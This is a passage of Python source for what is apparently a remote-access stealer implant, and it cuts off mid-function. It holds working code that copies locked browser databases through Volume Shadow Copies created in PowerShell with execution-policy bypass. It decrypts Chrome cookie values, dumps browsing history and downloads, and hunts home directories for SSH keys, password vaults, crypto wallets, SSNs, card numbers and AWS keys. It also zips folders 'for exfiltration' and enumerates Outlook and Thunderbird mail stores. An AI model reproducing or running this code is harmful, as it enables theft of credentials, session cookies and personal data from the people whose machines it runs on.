    Write-Output "SHADOW_PATH:$($shadow.DeviceObject)";
    Write-Output "SHADOW_ID:$($shadow.ID)";
}} else {{
    Write-Error "Failed to create shadow copy";
    exit 1;
}}
'''
                                        
                                        vss_create = subprocess.run(
                                            ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
                                            capture_output=True,
                                            text=True,
                                            timeout=30
                                        )
                                        
                                        if vss_create.returncode == 0:
                                            shadow_match = re.search(r'SHADOW_PATH:(.*)', vss_create.stdout)
                                            id_match = re.search(r'SHADOW_ID:(.*)', vss_create.stdout)
                                            
                                            if shadow_match:
                                                shadow_path = shadow_match.group(1).strip()
                                                shadow_id = id_match.group(1).strip() if id_match else None
                                                
                                                # Build shadow source path
                                                relative_path = db_path.replace(drive_letter + '\\', '')
                                                if not shadow_path.endswith('\\'):
                                                    shadow_path = shadow_path + '\\'
                                                shadow_source = shadow_path + relative_path
                                                
                                                # Create symbolic link
                                                shadow_link = os.path.join(temp_dir, f'shadow_link_{os.getpid()}')
                                                subprocess.run(['cmd', '/c', 'mklink', '/D', shadow_link, shadow_path.rstrip('\\')],
                                                              capture_output=True, timeout=10)
                                                
                                                # Copy from shadow
                                                link_source = os.path.join(shadow_link, relative_path)
                                                subprocess.run(['cmd', '/c', 'copy', link_source, temp_db],
                                                              capture_output=True, timeout=30)
                                                
                                                if os.path.exists(temp_db):
                                                    db_copied = True
                                                    print(f"[VSS] Copied from shadow successfully")
                                                
                                                # Cleanup
                                                try:
                                                    subprocess.run(['cmd', '/c', 'rmdir', shadow_link], timeout=5)
                                                except:
                                                    pass
                                                
                                                if shadow_id:
                                                    try:
                                                        ps_delete = f'(Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq "{shadow_id}" }}).Delete()'
                                                        subprocess.run(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_delete],
                                                                      capture_output=True, timeout=10)
                                                    except:
                                                        pass
                                    
                                    except Exception as vss_error:
                                        print(f"[VSS] VSS fallback failed: {vss_error}")
                                        if browser not in results:
                                            results[browser] = {}
                                        results[browser][f'{data_type}_error'] = f'Database locked and VSS failed: {str(copy_error)}'
                                else:
                                    # Not Windows or VSS failed
                                    if browser not in results:
                                        results[browser] = {}
                                    results[browser][f'{data_type}_error'] = f'Database locked: {str(copy_error)}'
                            
                            if db_copied:
                                try:
                                    conn = sqlite3.connect(temp_db)
                                    cursor = conn.cursor()
                                    
                                    if data_type == 'history':
                                        cursor.execute('''
                                            SELECT url, title, visit_count, last_visit_time 
                                            FROM urls 
                                            ORDER BY last_visit_time DESC 
                                            LIMIT 100
                                        ''')
                                        for row in cursor.fetchall():
                                            # Chrome timestamps are in microseconds since 1601
                                            timestamp = row[3] / 1000000 - 11644473600 if row[3] else 0
                                            browser_data.append({
                                                'url': row[0],
                                                'title': row[1] if row[1] else 'No title',
                                                'visit_count': row[2],
                                                'date': datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S') if timestamp > 0 else 'Unknown'
                                            })
                                    
                                    elif data_type == 'cookies':
                                        # First, check what tables exist
                                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                                        tables = [row[0] for row in cursor.fetchall()]
                                        
                                        if 'cookies' in tables:
                                            # Try to get column names
                                            cursor.execute("PRAGMA table_info(cookies);")
                                            columns = [row[1] for row in cursor.fetchall()]
                                            
                                            # Build query based on available columns
                                            if 'host_key' in columns:
                                                query = "SELECT host_key, name"
                                            else:
                                                query = "SELECT host, name" if 'host' in columns else "SELECT *"
                                            
                                            # Add BOTH value columns if they exist
                                            has_value = 'value' in columns
                                            has_encrypted = 'encrypted_value' in columns
                                            
                                            if has_value:
                                                query += ", value"
                                            else:
                                                query += ", NULL"  # Placeholder if value column doesn't exist
                                            
                                            if has_encrypted:
                                                query += ", encrypted_value"
                                            else:
                                                query += ", NULL"  # Placeholder if encrypted_value doesn't exist
                                            
                                            # Add expiry if exists
                                            if 'expires_utc' in columns:
                                                query += ", expires_utc"
                                            
                                            query += " FROM cookies LIMIT 100"
                                            
                                            cursor.execute(query)
                                            
                                            # Helper function to decrypt cookie values
                                            def decrypt_cookie_value(encrypted_value, key):
                                                try:
                                                    if not encrypted_value or len(encrypted_value) == 0:
                                                        return None
                                                    
                                                    # Check version prefix
                                                    version = encrypted_value[:3]
                                                    
                                                    # Debug: print first few bytes
                                                    # print(f"[DEBUG] Cookie encryption version bytes: {version.hex()} = {version}")
                                                    
                                                    if version == b'v10':
                                                        # AES-256-GCM decryption for v10
                                                        from Crypto.Cipher import AES
                                                        nonce = encrypted_value[3:15]
                                                        ciphertext = encrypted_value[15:]
                                                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                                                        plaintext = cipher.decrypt(ciphertext)
                                                        plaintext = plaintext[:-16]  # Remove authentication tag
                                                        return plaintext.decode('utf-8', errors='replace')
                                                    elif version == b'v11':
                                                        # AES-256-GCM decryption for v11 (same as v10)
                                                        from Crypto.Cipher import AES
                                                        nonce = encrypted_value[3:15]
                                                        ciphertext = encrypted_value[15:]
                                                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                                                        plaintext = cipher.decrypt(ciphertext)
                                                        plaintext = plaintext[:-16]  # Remove authentication tag
                                                        return plaintext.decode('utf-8', errors='replace')
                                                    elif version == b'v20':
                                                        # v20 App-Bound Encryption
                                                        return '[v20 App-Bound]'
                                                    else:
                                                        # No v10/v11/v20 prefix - try DPAPI
                                                        if os_type == 'Windows':
                                                            try:
                                                                import win32crypt
                                                                plaintext = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                                                                return plaintext.decode('utf-8', errors='replace')
                                                            except:
                                                                pass
                                                        # If DPAPI fails or not Windows, return hex preview
                                                        return f'[Encrypted: {encrypted_value[:8].hex()}...]'
                                                except Exception as e:
                                                    return f'[Decrypt error: {str(e)[:30]}]'
                                            
                                            for row in cursor.fetchall():
                                                cookie_data = {
                                                    'host': row[0] if len(row) > 0 else 'Unknown',
                                                    'name': row[1] if len(row) > 1 else 'Unknown'
                                                }
                                                
                                                # Check both value columns (plaintext and encrypted)
                                                # row[2] = value, row[3] = encrypted_value
                                                plaintext_value = row[2] if len(row) > 2 else None
                                                encrypted_value = row[3] if len(row) > 3 else None
                                                
                                                # DEBUG
                                                if cookie_data['name'] == 'brwsr':
                                                    print(f"[DEBUG] Cookie: {cookie_data['host']} - {cookie_data['name']}")
                                                    print(f"[DEBUG] Plaintext value: {plaintext_value} (type: {type(plaintext_value)})")
                                                    print(f"[DEBUG] Encrypted value: {encrypted_value[:20] if encrypted_value else None}")
                                                
                                                # Determine what to show
                                                if plaintext_value:
                                                    # Has plaintext value
                                                    cookie_data['value'] = str(plaintext_value)[:50] + '...' if len(str(plaintext_value)) > 50 else str(plaintext_value)
                                                elif encrypted_value and isinstance(encrypted_value, bytes) and len(encrypted_value) > 0:
                                                    # Has encrypted value - decrypt if requested
                                                    if decrypt_values and browser in decryption_keys:
                                                        decrypted = decrypt_cookie_value(encrypted_value, decryption_keys[browser])
                                                        if decrypted:
                                                            cookie_data['value'] = decrypted[:50] + '...' if len(decrypted) > 50 else decrypted
                                                            cookie_data['decrypted'] = True
                                                        else:
                                                            cookie_data['encrypted'] = True
                                                            cookie_data['value'] = '[Encrypted]'
                                                    else:
                                                        cookie_data['encrypted'] = True
                                                        cookie_data['value'] = '[Encrypted]'
                                                else:
                                                    # No value at all
                                                    cookie_data['value'] = '[Empty]'
                                                
                                                # Add expiry if available (now row[4] since we have both value columns)
                                                if len(row) > 4:
                                                    cookie_data['expires'] = row[4]
                                                
                                                browser_data.append(cookie_data)
                                        else:
                                            # No cookies table found
                                            if browser not in results:
                                                results[browser] = {}
                                            results[browser]['cookie_error'] = f'No cookies table found. Available tables: {", ".join(tables)}'
                                    
                                    elif data_type == 'downloads':
                                        cursor.execute('''
                                            SELECT target_path, tab_url, total_bytes, start_time 
                                            FROM downloads 
                                            ORDER BY start_time DESC 
                                            LIMIT 100
                                        ''')
                                        for row in cursor.fetchall():
                                            timestamp = row[3] / 1000000 - 11644473600 if row[3] else 0
                                            browser_data.append({
                                                'file': row[0],
                                                'url': row[1],
                                                'size_bytes': row[2],
                                                'date': datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S') if timestamp > 0 else 'Unknown'
                                            })
                                    
                                    conn.close()
                                    
                                except sqlite3.DatabaseError as e:
                                    # Database corruption or format issue
                                    if browser not in results:
                                        results[browser] = {}
                                    results[browser]['db_error'] = f'Database error: {str(e)}'
                                    
                                except Exception as e:
                                    # Other errors
                                    if browser not in results:
                                        results[browser] = {}
                                    results[browser]['extract_error'] = f'{type(e).__name__}: {str(e)}'
                                    
                                finally:
                                    # Clean up temp database
                                    if db_copied:
                                        try:
                                            os.remove(temp_db)
                                        except:
                                            pass
                
                if browser_data:
                    total_entries_count += len(browser_data)
                    results[browser] = {
                        'count': len(browser_data),
                        'data': browser_data[:50]  # Show first 50 entries in response
                    }
                    # Merge any errors that were set during extraction
                    if browser in results and isinstance(results[browser], dict):
                        for key in ['access_error', 'db_error', 'extract_error', 'cookie_error', 'bookmark_error']:
                            if key in results[browser]:
                                if 'count' in results[browser]:
                                    results[browser][key] = results[browser].get(key)
                else:
                    # Check if there were any errors during extraction
                    if browser not in results or not isinstance(results[browser], dict):
                        # Add diagnostic info
                        if browser != 'firefox':
                            check_path = paths.get(data_type, 'unknown')
                            path_exists = os.path.exists(check_path) if check_path != 'unknown' else False
                            results[browser] = {
                                'count': 0, 
                                'note': 'No data found or browser not installed',
                                'debug_path': check_path,
                                'path_exists': path_exists
                            }
                        else:
                            results[browser] = {'count': 0, 'note': 'No data found or browser not installed'}
                    else:
                        # Errors were already set, just add count
                        results[browser]['count'] = 0
            
            except Exception as e:
                results[browser] = {'error': str(e), 'traceback': f'{type(e).__name__}: {str(e)}'}
        
        # If save_to_file is requested and we have data, create a file
        if save_to_file and total_entries_count > 0 and data_type in ['history', 'cookies', 'bookmarks', 'downloads']:
            try:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"browser_{data_type}_{timestamp}.txt"
                filepath = Path(DOWNLOAD_DIR) / filename
                
                # Track actual entries saved to file (not limited to 100)
                file_entries_count = 0
                
                with open(filepath, 'w', encoding='utf-8') as f:
                    # Write header (we'll update total later)
                    header_pos = f.tell()
                    f.write(f"Browser {data_type.upper()} Export\n")
                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Total Entries: PLACEHOLDER_FOR_COUNT\n")  # We'll replace this
                    f.write("="*80 + "\n\n")
                    
                    for browser, info in results.items():
                        if info.get('count', 0) > 0 and 'data' in info:
                            # Re-extract all data for this browser (not just first 50)
                            # We need to get the full dataset
                            if browser in browser_paths and browser != 'firefox':
                                paths_dict = browser_paths[browser]
                                if data_type in paths_dict:
                                    db_path = paths_dict[data_type]
                                    
                                    f.write(f"\n{'='*80}\n")
                                    f.write(f"{browser.upper()}\n")
                                    f.write(f"{'='*80}\n\n")
                                    
                                    if data_type == 'bookmarks' and os.path.exists(db_path):
                                        # Bookmarks is JSON - re-read it
                                        try:
                                            with open(db_path, 'r', encoding='utf-8') as bm_file:
                                                bookmark_data = json.load(bm_file)
                                                
                                            def extract_all_bookmarks(node, results=[], level=0):
                                                if 'children' in node:
                                                    for child in node['children']:
                                                        extract_all_bookmarks(child, results, level+1)
                                                elif 'url' in node:
                                                    results.append({
                                                        'name': node.get('name', 'No name'),
                                                        'url': node['url'],
                                                        'level': level
                                                    })
                                                return results
                                            
                                            all_bookmarks = []
                                            if 'roots' in bookmark_data:
                                                for root_name, root_data in bookmark_data['roots'].items():
                                                    all_bookmarks.extend(extract_all_bookmarks(root_data))
                                            
                                            for i, bm in enumerate(all_bookmarks, 1):
                                                indent = "  " * bm.get('level', 0)
                                                f.write(f"{i}. {indent}{bm['name']}\n")
                                                f.write(f"   {indent}URL: {bm['url']}\n\n")
                                        except:
                                            pass
                                    
                                    elif data_type == 'history' and os.path.exists(db_path):
                                        # History is SQLite - re-query for all entries
                                        try:
                                            temp_db = os.path.join(temp_dir, f'{browser}_fullhistory_{os.getpid()}.db')
                                            shutil.copy2(db_path, temp_db)
                                            conn = sqlite3.connect(temp_db)
                                            cursor = conn.cursor()
                                            
                                            cursor.execute('''
                                                SELECT url, title, visit_count, last_visit_time 
                                                FROM urls 
                                                ORDER BY last_visit_time DESC
                                            ''')
                                            
                                            for i, row in enumerate(cursor.fetchall(), 1):
                                                timestamp_val = row[3] / 1000000 - 11644473600 if row[3] else 0
                                                date_str = datetime.fromtimestamp(timestamp_val).strftime('%Y-%m-%d %H:%M:%S') if timestamp_val > 0 else 'Unknown'
                                                
                                                f.write(f"{i}. {row[1] if row[1] else 'No title'}\n")
                                                f.write(f"   URL: {row[0]}\n")
                                                f.write(f"   Visits: {row[2]}, Last Visit: {date_str}\n\n")
                                            
                                            conn.close()
                                            os.remove(temp_db)
                                        except:
                                            pass
                                    
                                    elif data_type == 'cookies' and os.path.exists(db_path):
                                        # Cookies is SQLite - re-query for all entries
                                        try:
                                            temp_db = os.path.join(temp_dir, f'{browser}_fullcookies_{os.getpid()}.db')
                                            
                                            # Try direct copy first, use VSS if locked
                                            try:
                                                shutil.copy2(db_path, temp_db)
                                            except (PermissionError, OSError):
                                                # Use VSS fallback (same as extraction logic)
                                                if os_type == 'Windows':
                                                    import subprocess
                                                    import re
                                                    
                                                    drive_letter = os.path.splitdrive(db_path)[0]
                                                    ps_script = f'''
$class = [WMICLASS]"root\\cimv2:win32_shadowcopy";
$result = $class.create("{drive_letter}\\", "ClientAccessible");
if ($result.ReturnValue -eq 0) {{
    $shadowID = $result.ShadowID;
    $shadow = Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq $shadowID }};
    Write-Output "SHADOW_PATH:$($shadow.DeviceObject)";
    Write-Output "SHADOW_ID:$($shadow.ID)";
}}
'''
                                                    vss_create = subprocess.run(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
                                                                               capture_output=True, text=True, timeout=30)
                                                    
                                                    if vss_create.returncode == 0:
                                                        shadow_match = re.search(r'SHADOW_PATH:(.*)', vss_create.stdout)
                                                        id_match = re.search(r'SHADOW_ID:(.*)', vss_create.stdout)
                                                        
                                                        if shadow_match:
                                                            shadow_path = shadow_match.group(1).strip()
                                                            shadow_id = id_match.group(1).strip() if id_match else None
                                                            
                                                            relative_path = db_path.replace(drive_letter + '\\', '')
                                                            if not shadow_path.endswith('\\'):
                                                                shadow_path = shadow_path + '\\'
                                                            
                                                            shadow_link = os.path.join(temp_dir, f'shadow_link_save_{os.getpid()}')
                                                            subprocess.run(['cmd', '/c', 'mklink', '/D', shadow_link, shadow_path.rstrip('\\')],
                                                                         capture_output=True, timeout=10)
                                                            
                                                            link_source = os.path.join(shadow_link, relative_path)
                                                            subprocess.run(['cmd', '/c', 'copy', link_source, temp_db],
                                                                         capture_output=True, timeout=30)
                                                            
                                                            # Cleanup
                                                            try:
                                                                subprocess.run(['cmd', '/c', 'rmdir', shadow_link], timeout=5)
                                                            except:
                                                                pass
                                                            
                                                            if shadow_id:
                                                                try:
                                                                    ps_delete = f'(Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq "{shadow_id}" }}).Delete()'
                                                                    subprocess.run(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_delete],
                                                                                 capture_output=True, timeout=10)
                                                                except:
                                                                    pass
                                            
                                            if os.path.exists(temp_db):
                                                conn = sqlite3.connect(temp_db)
                                                cursor = conn.cursor()
                                                
                                                # Check table structure
                                                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                                                tables = [row[0] for row in cursor.fetchall()]
                                                
                                                if 'cookies' in tables:
                                                    cursor.execute("PRAGMA table_info(cookies);")
                                                    columns = [row[1] for row in cursor.fetchall()]
                                                    
                                                    # Build query
                                                    if 'host_key' in columns:
                                                        query = "SELECT host_key, name"
                                                    else:
                                                        query = "SELECT host, name" if 'host' in columns else "SELECT *"
                                                    
                                                    # Add BOTH value columns if they exist
                                                    has_value = 'value' in columns
                                                    has_encrypted = 'encrypted_value' in columns
                                                    
                                                    if has_value:
                                                        query += ", value"
                                                    else:
                                                        query += ", NULL"
                                                    
                                                    if has_encrypted:
                                                        query += ", encrypted_value"
                                                    else:
                                                        query += ", NULL"
                                                    
                                                    if 'expires_utc' in columns:
                                                        query += ", expires_utc"
                                                    
                                                    query += " FROM cookies"
                                                    
                                                    cursor.execute(query)
                                                    
                                                    # Helper function for decryption (same as above)
                                                    def decrypt_cookie_value_file(encrypted_value, key):
                                                        try:
                                                            if not encrypted_value or len(encrypted_value) == 0:
                                                                return None
                                                            version = encrypted_value[:3]
                                                            
                                                            if version == b'v10':
                                                                from Crypto.Cipher import AES
                                                                nonce = encrypted_value[3:15]
                                                                ciphertext = encrypted_value[15:]
                                                                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                                                                plaintext = cipher.decrypt(ciphertext)
                                                                plaintext = plaintext[:-16]
                                                                return plaintext.decode('utf-8', errors='replace')
                                                            elif version == b'v11':
                                                                from Crypto.Cipher import AES
                                                                nonce = encrypted_value[3:15]
                                                                ciphertext = encrypted_value[15:]
                                                                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                                                                plaintext = cipher.decrypt(ciphertext)
                                                                plaintext = plaintext[:-16]
                                                                return plaintext.decode('utf-8', errors='replace')
                                                            elif version == b'v20':
                                                                return '[v20 App-Bound]'
                                                            else:
                                                                if os_type == 'Windows':
                                                                    try:
                                                                        import win32crypt
                                                                        plaintext = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                                                                        return plaintext.decode('utf-8', errors='replace')
                                                                    except:
                                                                        pass
                                                                return f'[Encrypted: {encrypted_value[:8].hex()}...]'
                                                        except Exception as e:
                                                            return f'[Decrypt error: {str(e)[:30]}]'
                                                    
                                                    cookie_count = 0
                                                    for i, row in enumerate(cursor.fetchall(), 1):
                                                        cookie_count = i  # Track last index
                                                        host = row[0] if len(row) > 0 else 'Unknown'
                                                        name = row[1] if len(row) > 1 else 'Unknown'
                                                        
                                                        f.write(f"{i}. {host} - {name}\n")
                                                        
                                                        # Check both value columns
                                                        plaintext_value = row[2] if len(row) > 2 else None
                                                        encrypted_value = row[3] if len(row) > 3 else None
                                                        
                                                        if plaintext_value:
                                                            # Has plaintext value
                                                            value = str(plaintext_value)[:100] + '...' if len(str(plaintext_value)) > 100 else str(plaintext_value)
                                                            f.write(f"   Value: {value}\n")
                                                        elif encrypted_value and isinstance(encrypted_value, bytes) and len(encrypted_value) > 0:
                                                            # Has encrypted value - decrypt if requested
                                                            if decrypt_values and browser in decryption_keys:
                                                                decrypted = decrypt_cookie_value_file(encrypted_value, decryption_keys[browser])
                                                                if decrypted:
                                                                    value = decrypted[:100] + '...' if len(decrypted) > 100 else decrypted
                                                                    f.write(f"   Value: {value}\n")
                                                                else:
                                                                    f.write(f"   Value: [Encrypted]\n")
                                                            else:
                                                                f.write(f"   Value: [Encrypted]\n")
                                                        else:
                                                            # No value
                                                            f.write(f"   Value: [Empty]\n")
                                                        
                                                        # Expiry is now row[4] since we have both value columns
                                                        if len(row) > 4:
                                                            f.write(f"   Expires: {row[4]}\n")
                                                        
                                                        f.write("\n")
                                                
                                                    # Add to total file count
                                                    file_entries_count += cookie_count
                                                
                                                conn.close()
                                                os.remove(temp_db)
                                        except Exception as cookie_save_error:
                                            f.write(f"Error saving cookies: {str(cookie_save_error)}\n")
                                    
                                    elif data_type == 'downloads' and os.path.exists(db_path):
                                        # Downloads is also in the History database - re-query for all entries
                                        try:
                                            temp_db = os.path.join(temp_dir, f'{browser}_fulldownloads_{os.getpid()}.db')
                                            shutil.copy2(db_path, temp_db)
                                            conn = sqlite3.connect(temp_db)
                                            cursor = conn.cursor()
                                            
                                            cursor.execute('''
                                                SELECT target_path, tab_url, total_bytes, start_time 
                                                FROM downloads 
                                                ORDER BY start_time DESC
                                            ''')
                                            
                                            for i, row in enumerate(cursor.fetchall(), 1):
                                                timestamp_val = row[3] / 1000000 - 11644473600 if row[3] else 0
                                                date_str = datetime.fromtimestamp(timestamp_val).strftime('%Y-%m-%d %H:%M:%S') if timestamp_val > 0 else 'Unknown'
                                                size_mb = row[2] / (1024 * 1024) if row[2] else 0
                                                
                                                f.write(f"{i}. {row[0] if row[0] else 'No filename'}\n")
                                                f.write(f"   URL: {row[1] if row[1] else 'N/A'}\n")
                                                f.write(f"   Size: {size_mb:.2f} MB\n")
                                                f.write(f"   Date: {date_str}\n\n")
                                            
                                            conn.close()
                                            os.remove(temp_db)
                                        except:
                                            pass
                
                # Update the placeholder with actual count
                with open(filepath, 'r+', encoding='utf-8') as f:
                    content = f.read()
                    content = content.replace("PLACEHOLDER_FOR_COUNT", str(file_entries_count).ljust(len("PLACEHOLDER_FOR_COUNT")))
                    f.seek(0)
                    f.write(content)
                
                saved_file_path = str(filepath)
                file_size = filepath.stat().st_size
                results['_saved_file'] = {
                    'filename': filename,
                    'path': saved_file_path,
                    'size_kb': round(file_size / 1024, 2),
                    'entries': file_entries_count  # Use actual count, not limited display count
                }
            except Exception as e:
                results['_save_error'] = str(e)
        
        results_json = json.dumps(results, indent=2)
        return f"BROWSER_DATA:{data_type}:{results_json}"
    
    except Exception as e:
        return f"BROWSER_ERROR:{str(e)}"

# ============ NEW FEATURE 7: Smart File Exfiltration ============
async def smart_exfiltrate(mode: str, args: str = "") -> str:
    """
    Smart file exfiltration - automatically find and exfiltrate sensitive files
    Modes: 'auto', 'patterns', 'compress'
    Return format: EXFIL_DATA:mode:results_json or EXFIL_ERROR:message
    """
    try:
        import json
        import platform
        import fnmatch
        import re
        
        os_type = platform.system()
        results = {}
        
        if mode == 'auto':
            # Automatically search for sensitive file types
            sensitive_patterns = [
                '*.kdbx',      # KeePass databases
                '*.ppk',       # PuTTY private keys
                '*.pem',       # SSL certificates / SSH keys
                '*.key',       # Generic key files
                '*.p12',       # PKCS12 certificates
                '*.pfx',       # Windows certificates
                '*wallet.dat', # Cryptocurrency wallets
                '*.ovpn',      # OpenVPN configs
                '*password*',  # Files with 'password' in name
                '*secret*',    # Files with 'secret' in name
                '*credential*',# Files with 'credential' in name
                '*.rdp',       # Remote Desktop configs
                'id_rsa',      # SSH private key
                'id_dsa',      # SSH private key
                'id_ecdsa',    # SSH private key
                'id_ed25519',  # SSH private key
            ]
            
            found_files = []
            
            # Search in user directories
            if os_type == 'Windows':
                search_paths = [os.path.expandvars(r'%USERPROFILE%')]
            else:
                search_paths = [os.path.expanduser('~')]
            
            for search_path in search_paths:
                if not os.path.exists(search_path):
                    continue
                
                for root, dirs, files in os.walk(search_path):
                    # Skip system directories
                    dirs[:] = [d for d in dirs if d not in [
                        '.git', 'node_modules', '__pycache__', '.cache', 
                        'AppData\\Local', 'Library/Caches'
                    ]]
                    
                    for filename in files:
                        for pattern in sensitive_patterns:
                            if fnmatch.fnmatch(filename.lower(), pattern.lower()):
                                filepath = os.path.join(root, filename)
                                try:
                                    size = os.path.getsize(filepath)
                                    # Only include files under 10MB
                                    if size < 10 * 1024 * 1024:
                                        found_files.append({
                                            'path': filepath,
                                            'filename': filename,
                                            'size': size,
                                            'pattern_matched': pattern
                                        })
                                        
                                        if len(found_files) >= 50:  # Limit results
                                            break
                                except (PermissionError, OSError):
                                    continue
                        
                        if len(found_files) >= 50:
                            break
                    
                    if len(found_files) >= 50:
                        break
            
            results['found_files'] = found_files
            results['count'] = len(found_files)
            results['note'] = 'Use download command to retrieve specific files'
        
        elif mode == 'patterns':
            # Search file contents for sensitive patterns (SSN, credit cards, API keys, etc.)
            search_patterns = {
                'ssn': r'\b\d{3}-\d{2}-\d{4}\b',  # Social Security Number
                'credit_card': r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b',  # Credit card
                'api_key': r'["\']?[a-zA-Z0-9_-]{32,}["\']?',  # Generic API key
                'aws_key': r'AKIA[0-9A-Z]{16}',  # AWS Access Key
                'private_key': r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',  # Private keys
                'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email addresses
                'ipv4': r'\b(?:\d{1,3}\.){3}\d{1,3}\b',  # IPv4 addresses
            }
            
            matches = {}
            
            # Search in user directories
            if os_type == 'Windows':
                search_paths = [os.path.expandvars(r'%USERPROFILE%\\Documents')]
            else:
                search_paths = [os.path.expanduser('~/Documents'), os.path.expanduser('~/.ssh')]
            
            for search_path in search_paths:
                if not os.path.exists(search_path):
                    continue
                
                for root, dirs, files in os.walk(search_path):
                    dirs[:] = [d for d in dirs if d not in ['.git', 'node_modules', '__pycache__']]
                    
                    for filename in files:
                        # Only search text files
                        if not filename.endswith(('.txt', '.log', '.conf', '.config', '.ini', 
                                                 '.xml', '.json', '.py', '.sh', '.bat', '.cmd', 
                                                 '.md', '.csv')):
                            continue
                        
                        filepath = os.path.join(root, filename)
                        try:
                            # Skip large files
                            if os.path.getsize(filepath) > 5 * 1024 * 1024:  # 5MB max
                                continue
                            
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                
                                for pattern_name, pattern in search_patterns.items():
                                    found = re.findall(pattern, content)
                                    if found:
                                        if pattern_name not in matches:
                                            matches[pattern_name] = []
                                        
                                        matches[pattern_name].append({
                                            'file': filepath,
                                            'count': len(found),
                                            'samples': found[:5]  # First 5 matches
                                        })
                        
                        except (PermissionError, OSError, UnicodeDecodeError):
                            continue
            
            results['matches'] = matches
            results['pattern_count'] = len(matches)
        
        elif mode == 'compress':
            # Compress a directory for exfiltration
            # Format: compress:/path/to/directory
            if args.startswith('/') or args[1:3] == ':\\':  # Valid path
                import zipfile
                import tempfile
                
                source_dir = args
                if not os.path.exists(source_dir):
                    return f"EXFIL_ERROR:Directory not found: {source_dir}"
                
                if not os.path.isdir(source_dir):
                    return f"EXFIL_ERROR:Not a directory: {source_dir}"
                
                # Create zip in temp directory
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                zip_name = f"exfil_{os.path.basename(source_dir)}_{timestamp}.zip"
                zip_path = os.path.join(tempfile.gettempdir(), zip_name)
                
                try:
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        file_count = 0
                        total_size = 0
                        
                        for root, dirs, files in os.walk(source_dir):
                            for file in files:
                                file_path = os.path.join(root, file)
                                try:
                                    # Add file to zip
                                    arcname = os.path.relpath(file_path, source_dir)
                                    zipf.write(file_path, arcname)
                                    file_count += 1
                                    total_size += os.path.getsize(file_path)
                                    
                                    # Stop if zip gets too large (100MB limit)
                                    if total_size > 100 * 1024 * 1024:
                                        break
                                except:
                                    continue
                    
                    zip_size = os.path.getsize(zip_path)
                    results['zip_file'] = zip_path
                    results['zip_name'] = zip_name
                    results['zip_size'] = zip_size
                    results['files_compressed'] = file_count
                    results['note'] = f'Use download command to retrieve: download {zip_path}'
                
                except Exception as e:
                    return f"EXFIL_ERROR:Compression failed: {str(e)}"
            else:
                return f"EXFIL_ERROR:Invalid directory path: {args}"
        
        results_json = json.dumps(results, indent=2)
        return f"EXFIL_DATA:{mode}:{results_json}"
    
    except Exception as e:
        return f"EXFIL_ERROR:{str(e)}"

# ============ NEW FEATURE 9: Email & Messaging Access ============
async def extract_messages(msg_type: str) -> str:
    """
    Extract emails and messaging data
    msg_type: 'email_list', 'email_outlook', 'email_thunderbird', 'discord', 'slack'
    Return format: MSG_DATA:type:data_json or MSG_ERROR:message
    """
    try:
        import json
        import platform
        
        os_type = platform.system()
        results = {}
        
        if msg_type == 'email_list':
            # List email clients found on system
            email_clients = {}
            
            if os_type == 'Windows':
                # Check for Outlook
                outlook_path = os.path.expandvars(r'%APPDATA%\Microsoft\Outlook')
                if os.path.exists(outlook_path):
                    pst_files = []
                    try:
                        for file in os.listdir(outlook_path):
                            if file.lower().endswith('.pst') or file.lower().endswith('.ost'):
                                full_path = os.path.join(outlook_path, file)
                                pst_files.append(full_path)
                    except Exception as e:
                        pass
                    
                    email_clients['outlook'] = {
                        'found': True,
                        'path': outlook_path,
                        'data_files': pst_files if pst_files else [],
                        'note': f'Found {len(pst_files)} PST/OST file(s)' if pst_files else 'No PST/OST files in Outlook directory'
                    }
                
                # Check for Windows Mail
                mail_path = os.path.expandvars(r'%LOCALAPPDATA%\Comms\UnistoreDB')
                if os.path.exists(mail_path):
                    email_clients['windows_mail'] = {
                        'found': True,
                        'location': mail_path
                    }
            
            # Check for Thunderbird (all platforms)
            if os_type == 'Windows':
                tb_path = os.path.expandvars(r'%APPDATA%\Thunderbird\Profiles')
            elif os_type == 'Linux':
                tb_path = os.path.expanduser('~/.thunderbird')
            elif os_type == 'Darwin':
                tb_path = os.path.expanduser('~/Library/Thunderbird/Profiles')
            else:
                tb_path = None
            
            if tb_path and os.path.exists(tb_path):
                profiles = []
                for item in os.listdir(tb_path):
                    item_path = os.path.join(tb_path, item)
                    if os.path.isdir(item_path):
                        profiles.append(item)
                
                email_clients['thunderbird'] = {
                    'found': True,
                    'profiles': profiles,
                    'location': tb_path
                }
            
            results['email_clients'] = email_clients
        
        elif msg_type == 'email_thunderbird':
            # Extract Thunderbird emails (simplified - just enumerate)
            if os_type == 'Windows':
                tb_path = os.path.expandvars(r'%APPDATA%\Thunderbird\Profiles')
            elif os_type == 'Linux':
                tb_path = os.path.expanduser('~/.thunderbird')
            elif os_type == 'Darwin':
                tb_path = os.path.expanduser('~/Library/Thunderbird/Profiles')
            
            if os.path.exists(tb_path):
